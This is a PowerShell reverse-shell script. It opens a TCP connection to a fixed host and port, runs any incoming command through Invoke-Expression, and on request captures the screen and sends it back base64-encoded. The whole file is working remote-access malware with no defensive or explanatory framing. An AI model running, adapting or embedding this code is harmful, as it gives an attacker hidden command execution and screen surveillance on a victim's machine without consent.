# --- THE "LOCK IN" PRIMITIVE SHELL ---
$ip = '192.168.1.15'
$port = 4444

# No functions, no extra assemblies at the top. 
# We load them only if the command 'screenshot' is typed.

try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $reader = New-Object System.IO.StreamReader($stream)

    $writer.WriteLine("--- Connection Established ---")

    while($client.Connected) {
        $writer.Write("PS " + (Get-Location).Path + "> ")
        $line = $reader.ReadLine()
        if ($null -eq $line) { break }
        $cmd = $line.Trim()

        if ($cmd -eq "exit") { break }

        # LOGIC BRANCH
        if ($cmd -eq "screenshot") {
            $out = try {
                # Load graphics ONLY right now
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $sr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bm = New-Object System.Drawing.Bitmap($sr.Width, $sr.Height)
                $g  = [System.Drawing.Graphics]::FromImage($bm)
                $g.CopyFromScreen($sr.Location, [System.Drawing.Point]::Empty, $sr.Size)
                $ms = New-Object System.IO.MemoryStream
                $bm.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $str = [Convert]::ToBase64String($ms.ToArray())
                $g.Dispose(); $bm.Dispose(); $ms.Dispose()
                $str 
            } catch { "Error: $($_.Exception.Message)" }
        } 
        else {
            # Run command
            $out = try { iex $cmd 2>&1 | Out-String } catch { $_.Exception.Message }
        }

        # Send result
        $writer.WriteLine($out)
    }
} catch {
    # If it crashes, this keeps the window open
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Yellow
    Write-Host "Press any key to exit..."
    $null = [System.Console]::ReadKey()
} finally {
    if ($client) { $client.Close() }
}
